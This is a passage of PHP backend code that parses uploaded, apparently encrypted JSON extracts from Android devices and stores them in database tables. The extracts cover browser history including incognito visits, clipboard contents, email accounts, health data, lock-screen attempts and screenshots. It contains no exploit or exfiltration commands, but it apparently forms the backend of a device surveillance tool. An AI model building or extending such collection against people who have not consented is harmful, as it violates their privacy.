                'clir_enabled'           => isset($imsArr['clir_enabled']) ? ($imsArr['clir_enabled'] ? 1 : 0) : null,
                'colp_enabled'           => isset($imsArr['colp_enabled']) ? ($imsArr['colp_enabled'] ? 1 : 0) : null,
                'ussd_service_available' => isset($imsArr['ussd_service_available']) ? ($imsArr['ussd_service_available'] ? 1 : 0) : null,
                'extracted_at'           => $extracted_at,
                'created_at'             => $dated,
            ];

            $exists = $this->db->table('tbl_telephony_network')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_telephony_network')->insert($data);
            log_message('info', '[parse_telephony_network] Inserted telephony network snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_telephony_network] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_system_locale(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['timestamp'] ?? null;

            $locale_region = $json['locale_region'] ?? null;
            if (is_array($locale_region)) $locale_region = json_encode($locale_region);

            $system_fonts = $json['system_fonts'] ?? null;
            if (is_array($system_fonts)) $system_fonts = json_encode($system_fonts);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'locale_region_json' => $locale_region,
                'system_fonts_json' => $system_fonts,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_system_locale')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_system_locale')->insert($data);
            log_message('info', '[parse_system_locale] Inserted system locale snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_system_locale] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AppPermissionExtractor
     * File prefix: app_permissions_TIMESTAMP.enc
     */
    public function parse_app_permissions(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['permissions_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $perm) {
                $pkg = $perm['package_name'] ?? null;
                $name = $perm['permission_name'] ?? null;
                if (!$pkg || !$name) continue;

                $exists = $this->db->table('tbl_system_app_permissions')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('package_name', $pkg)
                    ->where('permission_name', $name)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'package_name' => $pkg,
                    'permission_name' => $name,
                    'is_requested' => isset($perm['is_requested']) ? ($perm['is_requested'] ? 1 : 0) : 1,
                    'is_granted' => isset($perm['is_granted']) ? ($perm['is_granted'] ? 1 : 0) : 0,
                    'is_runtime' => isset($perm['is_runtime']) ? ($perm['is_runtime'] ? 1 : 0) : 0,
                    'is_system_fixed' => isset($perm['is_system_fixed']) ? ($perm['is_system_fixed'] ? 1 : 0) : 0,
                    'is_revoked' => isset($perm['is_revoked']) ? ($perm['is_revoked'] ? 1 : 0) : 0,
                    'grant_time' => $perm['grant_time'] ?? null,
                    'last_used_time' => $perm['last_used_time'] ?? null,
                    'flags' => $perm['flags'] ?? null,
                    'is_one_time' => isset($perm['is_one_time']) ? ($perm['is_one_time'] ? 1 : 0) : 0,
                    'is_auto_revoke_whitelisted' => isset($perm['is_auto_revoke_whitelisted']) ? ($perm['is_auto_revoke_whitelisted'] ? 1 : 0) : 0,
                    'is_hard_restricted' => isset($perm['is_hard_restricted']) ? ($perm['is_hard_restricted'] ? 1 : 0) : 0,
                    'is_soft_restricted' => isset($perm['is_soft_restricted']) ? ($perm['is_soft_restricted'] ? 1 : 0) : 0,
                    'user_set' => isset($perm['user_set']) ? ($perm['user_set'] ? 1 : 0) : 0,
                    'fixed_policy' => isset($perm['fixed_policy']) ? ($perm['fixed_policy'] ? 1 : 0) : 0,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_system_app_permissions')->insertBatch($batch);
            }

            log_message('info', '[parse_app_permissions] Inserted ' . count($batch) . ' permissions from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_app_permissions] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * BrowserHistoryExtractor
     * File prefix: browser_history_TIMESTAMP.enc
     */
    public function parse_browser_history(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['history_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $item) {
                $url = $item['url'] ?? null;
                if (!$url) continue;

                $exists = $this->db->table('tbl_extracted_browser_history')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('url', $url)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'browser_package' => $item['browser_package'] ?? null,
                    'url' => $url,
                    'title' => $item['title'] ?? null,
                    'visit_count' => $item['visit_count'] ?? null,
                    'last_visit_time' => $item['last_visit_time'] ?? null,
                    'typed_count' => $item['typed_count'] ?? null,
                    'favicon_base64' => $item['favicon_base64'] ?? null,
                    'is_bookmark' => isset($item['is_bookmark']) ? ($item['is_bookmark'] ? 1 : 0) : 0,
                    'bookmark_folder' => $item['bookmark_folder'] ?? null,
                    'transition_type' => $item['transition_type'] ?? null,
                    'referrer_url' => $item['referrer_url'] ?? null,
                    'visit_duration_ms' => $item['visit_duration_ms'] ?? null,
                    'search_terms' => $item['search_terms'] ?? null,
                    'is_incognito' => isset($item['is_incognito']) ? ($item['is_incognito'] ? 1 : 0) : 0,
                    'domain' => $item['domain'] ?? null,
                    'scheme' => $item['scheme'] ?? null,
                    'path_depth' => $item['path_depth'] ?? null,
                    'query_params' => $item['query_params'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_extracted_browser_history')->insertBatch($batch);
            }

            log_message('info', '[parse_browser_history] Inserted ' . count($batch) . ' history rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_browser_history] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ClipboardExtractor
     * File prefix: clipboard_TIMESTAMP.enc
     */
    public function parse_clipboard(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'clip_data_type' => $json['clip_data_type'] ?? null,
                'clip_text' => $json['clip_text'] ?? null,
                'clip_html' => $json['clip_html'] ?? null,
                'clip_intent_action' => $json['clip_intent_action'] ?? null,
                'clip_intent_package' => $json['clip_intent_package'] ?? null,
                'clip_uri' => $json['clip_uri'] ?? null,
                'item_count' => $json['item_count'] ?? null,
                'primary_clip_description' => $json['primary_clip_description'] ?? null,
                'timestamp' => $json['timestamp'] ?? null,
                'source_package' => $json['source_package'] ?? null,
                'label' => $json['label'] ?? null,
                'is_sensitive' => isset($json['is_sensitive']) ? ($json['is_sensitive'] ? 1 : 0) : 0,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_extracted_clipboard_entries')->insert($data);
            log_message('info', '[parse_clipboard] Inserted clipboard snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_clipboard] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ContentProviderExtractor
     * File prefix: content_providers_TIMESTAMP.enc
     */
    public function parse_content_providers(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['providers_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $provider) {
                $authority = $provider['authority'] ?? null;
                if (!$authority) continue;

                $exists = $this->db->table('tbl_content_providers')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('authority', $authority)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'authority' => $authority,
                    'package_name' => $provider['package_name'] ?? null,
                    'name' => $provider['name'] ?? null,
                    'read_permission' => $provider['read_permission'] ?? null,
                    'write_permission' => $provider['write_permission'] ?? null,
                    'grant_uri_permissions' => isset($provider['grant_uri_permissions']) ? ($provider['grant_uri_permissions'] ? 1 : 0) : 0,
                    'is_exported' => isset($provider['is_exported']) ? ($provider['is_exported'] ? 1 : 0) : 0,
                    'is_syncable' => isset($provider['is_syncable']) ? ($provider['is_syncable'] ? 1 : 0) : 0,
                    'is_multiprocess' => isset($provider['is_multiprocess']) ? ($provider['is_multiprocess'] ? 1 : 0) : 0,
                    'init_order' => $provider['init_order'] ?? null,
                    'authorities' => $provider['authorities'] ?? null,
                    'flags' => $provider['flags'] ?? null,
                    'path_permissions' => is_array($provider['path_permissions'] ?? null) ? json_encode($provider['path_permissions']) : ($provider['path_permissions'] ?? null),
                    'types' => is_array($provider['types'] ?? null) ? json_encode($provider['types']) : ($provider['types'] ?? null),
                    'stream_types' => is_array($provider['stream_types'] ?? null) ? json_encode($provider['stream_types']) : ($provider['stream_types'] ?? null),
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_content_providers')->insertBatch($batch);
            }

            log_message('info', '[parse_content_providers] Inserted ' . count($batch) . ' providers from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_content_providers] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AppCrashLogExtractor
     * File prefix: crash_logs_TIMESTAMP.enc
     */
    public function parse_crash_logs(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['crash_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $crash) {
                $pid = $crash['pid'] ?? null;
                $crashTime = $crash['crash_time'] ?? null;
                if ($pid === null || !$crashTime) continue;

                $exists = $this->db->table('tbl_system_crash_logs')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('pid', $pid)
                    ->where('crash_time', $crashTime)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'package_name' => $crash['package_name'] ?? null,
                    'process_name' => $crash['process_name'] ?? null,
                    'pid' => $pid,
                    'uid' => $crash['uid'] ?? null,
                    'crash_time' => $crashTime,
                    'crash_type' => $crash['crash_type'] ?? null,
                    'exception_class' => $crash['exception_class'] ?? null,
                    'exception_message' => $crash['exception_message'] ?? null,
                    'stack_trace' => $crash['stack_trace'] ?? null,
                    'build_fingerprint' => $crash['build_fingerprint'] ?? null,
                    'android_version' => $crash['android_version'] ?? null,
                    'device_model' => $crash['device_model'] ?? null,
                    'is_system_app' => isset($crash['is_system_app']) ? ($crash['is_system_app'] ? 1 : 0) : 0,
                    'is_silent' => isset($crash['is_silent']) ? ($crash['is_silent'] ? 1 : 0) : 0,
                    'is_user_perceived' => isset($crash['is_user_perceived']) ? ($crash['is_user_perceived'] ? 1 : 0) : 0,
                    'logcat_tail' => $crash['logcat_tail'] ?? null,
                    'dropbox_tag' => $crash['dropbox_tag'] ?? null,
                    'dropbox_data' => $crash['dropbox_data'] ?? null,
                    'tombstone_path' => $crash['tombstone_path'] ?? null,
                    'minidump_path' => $crash['minidump_path'] ?? null,
                    'last_crash_time' => $crash['last_crash_time'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_system_crash_logs')->insertBatch($batch);
            }

            log_message('info', '[parse_crash_logs] Inserted ' . count($batch) . ' crashes from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_crash_logs] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DigitalWellbeingExtractor
     * File prefix: digital_wellbeing_TIMESTAMP.enc
     */
    public function parse_digital_wellbeing(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_system_digital_wellbeing')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $screenTime = $json['screen_time_by_category'] ?? [];
            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'focus_mode_enabled' => isset($json['focus_mode_enabled']) ? ($json['focus_mode_enabled'] ? 1 : 0) : 0,
                'focus_mode_apps' => is_array($json['focus_mode_apps'] ?? null) ? json_encode($json['focus_mode_apps']) : ($json['focus_mode_apps'] ?? null),
                'bedtime_mode_enabled' => isset($json['bedtime_mode_enabled']) ? ($json['bedtime_mode_enabled'] ? 1 : 0) : 0,
                'bedtime_schedule' => $json['bedtime_schedule'] ?? null,
                'bedtime_grayscale' => isset($json['bedtime_grayscale']) ? ($json['bedtime_grayscale'] ? 1 : 0) : 0,
                'bedtime_dnd' => isset($json['bedtime_dnd']) ? ($json['bedtime_dnd'] ? 1 : 0) : 0,
                'unlock_count' => $json['unlock_count'] ?? null,
                'notification_count' => $json['notification_count'] ?? null,
                'wind_down_enabled' => isset($json['wind_down_enabled']) ? ($json['wind_down_enabled'] ? 1 : 0) : 0,
                'wind_down_schedule' => $json['wind_down_schedule'] ?? null,
                'total_daily_usage_minutes' => $json['total_daily_usage_minutes'] ?? null,
                'social_minutes' => $screenTime['social'] ?? null,
                'productivity_minutes' => $screenTime['productivity'] ?? null,
                'entertainment_minutes' => $screenTime['entertainment'] ?? null,
                'other_minutes' => $screenTime['other'] ?? null,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_system_digital_wellbeing')->insert($data);
            $wellbeingId = $this->db->insertID();

            $apps = $json['apps'] ?? [];
            if (is_array($apps) && $wellbeingId > 0) {
                $appBatch = [];
                foreach ($apps as $app) {
                    $appBatch[] = [
                        'wellbeing_id' => $wellbeingId,
                        'owner_id' => $owner_id,
                        'device_id' => $device_id,
                        'package_name' => $app['package_name'] ?? null,
                        'app_timer_minutes' => $app['app_timer_minutes'] ?? null,
                        'app_timer_spent_minutes' => $app['app_timer_spent_minutes'] ?? null,
                        'daily_usage_minutes' => $app['daily_usage_minutes'] ?? null,
                        'daily_limit_minutes' => $app['daily_limit_minutes'] ?? null,
                        'category' => $app['category'] ?? null,
                        'created_at' => $dated,
                    ];
                }
                if (!empty($appBatch)) {
                    $this->db->table('tbl_system_digital_wellbeing_apps')->insertBatch($appBatch);
                }
            }

            log_message('info', '[parse_digital_wellbeing] Inserted wellbeing snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_digital_wellbeing] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DozeStandbyExtractor
     * File prefix: doze_standby_TIMESTAMP.enc
     */
    public function parse_doze_standby(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $exists = $this->db->table('tbl_system_doze_standby')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'is_in_doze' => isset($json['is_in_doze']) ? ($json['is_in_doze'] ? 1 : 0) : 0,
                'is_in_light_doze' => isset($json['is_in_light_doze']) ? ($json['is_in_light_doze'] ? 1 : 0) : 0,
                'is_in_deep_doze' => isset($json['is_in_deep_doze']) ? ($json['is_in_deep_doze'] ? 1 : 0) : 0,
                'power_save_mode' => isset($json['power_save_mode']) ? ($json['power_save_mode'] ? 1 : 0) : 0,
                'battery_saver_enabled' => isset($json['battery_saver_enabled']) ? ($json['battery_saver_enabled'] ? 1 : 0) : 0,
                'battery_saver_since' => $json['battery_saver_since'] ?? null,
                'next_maintenance_window' => $json['next_maintenance_window'] ?? null,
                'last_standby_transition' => $json['last_standby_transition'] ?? null,
                'adaptive_battery_enabled' => isset($json['adaptive_battery_enabled']) ? ($json['adaptive_battery_enabled'] ? 1 : 0) : 0,
                'adaptive_battery_learning' => isset($json['adaptive_battery_learning']) ? ($json['adaptive_battery_learning'] ? 1 : 0) : 0,
                'device_standby_bucket' => $json['device_standby_bucket'] ?? null,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_system_doze_standby')->insert($data);
            $dozeId = $this->db->insertID();

            $apps = $json['apps'] ?? [];
            if (is_array($apps) && $dozeId > 0) {
                $appBatch = [];
                foreach ($apps as $app) {
                    $appBatch[] = [
                        'doze_id' => $dozeId,
                        'owner_id' => $owner_id,
                        'device_id' => $device_id,
                        'package_name' => $app['package_name'] ?? null,
                        'whitelisted' => isset($app['whitelisted']) ? ($app['whitelisted'] ? 1 : 0) : 0,
                        'whitelist_reason' => $app['whitelist_reason'] ?? null,
                        'last_standby_transition' => $app['last_standby_transition'] ?? null,
                        'restricted_reasons' => is_array($app['restricted_reasons'] ?? null) ? json_encode($app['restricted_reasons']) : ($app['restricted_reasons'] ?? null),
                        'standby_bucket' => $app['standby_bucket'] ?? null,
                        'is_app_standby' => isset($app['is_app_standby']) ? ($app['is_app_standby'] ? 1 : 0) : 0,
                        'standby_bucket_reason' => $app['standby_bucket_reason'] ?? null,
                        'restriction_level' => $app['restriction_level'] ?? null,
                        'created_at' => $dated,
                    ];
                }
                if (!empty($appBatch)) {
                    $this->db->table('tbl_system_doze_standby_apps')->insertBatch($appBatch);
                }
            }

            log_message('info', '[parse_doze_standby] Inserted doze/standby snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_doze_standby] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * EmailExtractor
     * File prefix: email_TIMESTAMP.enc
     */
    public function parse_email(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['email_accounts'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $account) {
                $email = $account['account_email'] ?? null;
                if (!$email) continue;

                $exists = $this->db->table('tbl_extracted_email_accounts')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('account_email', $email)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'account_email' => $email,
                    'account_type' => $account['account_type'] ?? null,
                    'provider' => $account['provider'] ?? null,
                    'folder' => $account['folder'] ?? null,
                    'is_primary' => isset($account['is_primary']) ? ($account['is_primary'] ? 1 : 0) : 0,
                    'last_sync_time' => $account['last_sync_time'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_extracted_email_accounts')->insertBatch($batch);
            }

            log_message('info', '[parse_email] Inserted ' . count($batch) . ' email accounts from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_email] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * HealthDataExtractor
     * File prefix: health_data_TIMESTAMP.enc
     */
    public function parse_health_data(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['data'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $entry) {
                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'data_type' => $entry['data_type'] ?? null,
                    'value' => $entry['value'] ?? null,
                    'unit' => $entry['unit'] ?? null,
                    'start_time' => $entry['start_time'] ?? null,
                    'end_time' => $entry['end_time'] ?? null,
                    'data_source' => $entry['data_source'] ?? null,
                    'data_source_type' => $entry['data_source_type'] ?? null,
                    'data_source_name' => $entry['data_source_name'] ?? null,
                    'data_source_package' => $entry['data_source_package'] ?? null,
                    'step_count' => $entry['step_count'] ?? null,
                    'session_id' => $entry['session_id'] ?? null,
                    'session_name' => $entry['session_name'] ?? null,
                    'session_type' => $entry['session_type'] ?? null,
                    'session_description' => $entry['session_description'] ?? null,
                    'distance_meters' => $entry['distance_meters'] ?? null,
                    'calories_kcal' => $entry['calories_kcal'] ?? null,
                    'sleep_stage' => $entry['sleep_stage'] ?? null,
                    'sleep_efficiency' => $entry['sleep_efficiency'] ?? null,
                    'workout_type' => $entry['workout_type'] ?? null,
                    'workout_duration_seconds' => $entry['workout_duration_seconds'] ?? null,
                    'max_heart_rate' => $entry['max_heart_rate'] ?? null,
                    'avg_heart_rate' => $entry['avg_heart_rate'] ?? null,
                    'heart_rate_bpm' => $entry['heart_rate_bpm'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_health_data')->insertBatch($batch);
            }

            log_message('info', '[parse_health_data] Inserted ' . count($batch) . ' health entries from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_health_data] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * KeyboardInputExtractor
     * File prefix: keyboard_input_TIMESTAMP.enc
     */
    public function parse_keyboard_input(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['ime_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $ime) {
                $imeId = $ime['ime_id'] ?? null;
                if (!$imeId) continue;

                $exists = $this->db->table('tbl_keyboard_input')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('ime_id', $imeId)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'ime_package' => $ime['ime_package'] ?? null,
                    'ime_id' => $imeId,
                    'ime_label' => $ime['ime_label'] ?? null,
                    'is_enabled' => isset($ime['is_enabled']) ? ($ime['is_enabled'] ? 1 : 0) : 0,
                    'is_default' => isset($ime['is_default']) ? ($ime['is_default'] ? 1 : 0) : 0,
                    'is_system_ime' => isset($ime['is_system_ime']) ? ($ime['is_system_ime'] ? 1 : 0) : 0,
                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
                    'supports_switching_to_next_input_method' => isset($ime['supports_switching_to_next_input_method']) ? ($ime['supports_switching_to_next_input_method'] ? 1 : 0) : 0,
                    'subtypes' => is_array($ime['subtypes'] ?? null) ? json_encode($ime['subtypes']) : ($ime['subtypes'] ?? null),
                    'extracted_at' => $extracted_at,
                    'created_at' => $dated,
                    'updated_at' => $dated,
                ];
            }

            if (!empty($batch)) {
                $this->db->table('tbl_keyboard_input')->insertBatch($batch);
            }

            log_message('info', '[parse_keyboard_input] Inserted ' . count($batch) . ' IME rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_keyboard_input] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * KeyguardExtractor
     * File prefix: keyguard_TIMESTAMP.enc
     */
    public function parse_keyguard(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id' => $owner_id,
                'device_id' => $device_id,
                'event_type' => $json['event_type'] ?? null,
                'timestamp' => $json['timestamp'] ?? null,
                'method' => $json['method'] ?? null,
                'success' => $json['success'] ?? null,
                'failed_attempts' => $json['failed_attempts'] ?? null,
                'remaining_attempts' => $json['remaining_attempts'] ?? null,
                'lockout_until' => $json['lockout_until'] ?? null,
                'strong_auth_required_reason' => $json['strong_auth_required_reason'] ?? null,
                'biometric_error' => $json['biometric_error'] ?? null,
                'is_secure' => isset($json['is_secure']) ? ($json['is_secure'] ? 1 : 0) : 0,
                'biometric_type' => $json['biometric_type'] ?? null,
                'biometric_available' => isset($json['biometric_available']) ? ($json['biometric_available'] ? 1 : 0) : 0,
                'notifications_on_lockscreen' => isset($json['notifications_on_lockscreen']) ? ($json['notifications_on_lockscreen'] ? 1 : 0) : null,
                'sensitive_notifications_hidden' => isset($json['sensitive_notifications_hidden']) ? ($json['sensitive_notifications_hidden'] ? 1 : 0) : null,
                'lock_timeout_ms' => $json['lock_timeout_ms'] ?? null,
                'lock_screen_widgets' => $json['lock_screen_widgets'] ?? null,
                'camera_shortcut' => $json['camera_shortcut'] ?? null,
                'assistant_shortcut' => $json['assistant_shortcut'] ?? null,
                'storage_encryption_status' => $json['storage_encryption_status'] ?? null,
                'strong_auth_timeout_ms' => $json['strong_auth_timeout_ms'] ?? null,
                'extracted_at' => $extracted_at,
                'created_at' => $dated,
                'updated_at' => $dated,
            ];

            $this->db->table('tbl_system_keyguard_events')->insert($data);
            log_message('info', '[parse_keyguard] Inserted keyguard snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_keyguard] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ScreenshotExtractor
     * File prefix: screenshots_TIMESTAMP.enc
     */
    public function parse_screenshots(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $list = $json['screenshot_list'] ?? [];
            if (!is_array($list)) return false;

            $batch = [];
            foreach ($list as $item) {
                $filePath = $item['file_path'] ?? null;
                $timestamp = $item['timestamp'] ?? null;
                if (!$filePath || !$timestamp) continue;

                $exists = $this->db->table('tbl_extracted_screenshots')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('file_path', $filePath)
                    ->where('timestamp', $timestamp)
                    ->countAllResults() > 0;
                if ($exists) continue;

                $batch[] = [
                    'owner_id' => $owner_id,
                    'device_id' => $device_id,
                    'file_path' => $filePath,
                    'file_name' => $item['file_name'] ?? null,
                    'file_size' => $item['file_size'] ?? null,
                    'mime_type' => $item['mime_type'] ?? null,
                    'width' => $item['width'] ?? null,
                    'height' => $item['height'] ?? null,
                    'timestamp' => $timestamp,
                    'source_package' => $item['source_package'] ?? null,
                    'is_screen_record' => isset($item['is_screen_record']) ? ($item['is_screen_record'] ? 1 : 0) : 0,
                    'duration_ms' => $item['duration_ms'] ?? null,
                    'video_path' => $item['video_path'] ?? null,
                    'video_size' => $item['video_size'] ?? null,
                    'video_width' => $item['video_width'] ?? null,
                    'video_height' => $item['video_height'] ?? null,
                    'video_duration_ms' => $item['video_duration_ms'] ?? null,
                    'video_frame_rate' => $item['video_frame_rate'] ?? null,
                    'video_bitrate' => $item['video_bitrate'] ?? null,
                    'is_edited' => isset($item['is_edited']) ? ($item['is_edited'] ? 1 : 0) : 0,
                    'edit_timestamp' => $item['edit_timestamp'] ?? null,
                    'edit_app_package' => $item['edit_app_package'] ?? null,
                    'contains_pii' => isset($item['contains_pii']) ? ($item['contains_pii'] ? 1 : 0) : 0,
                    'pii_types' => is_array($item['pii_types'] ?? null) ? json_encode($item['pii_types']) : ($item['pii_types'] ?? null),
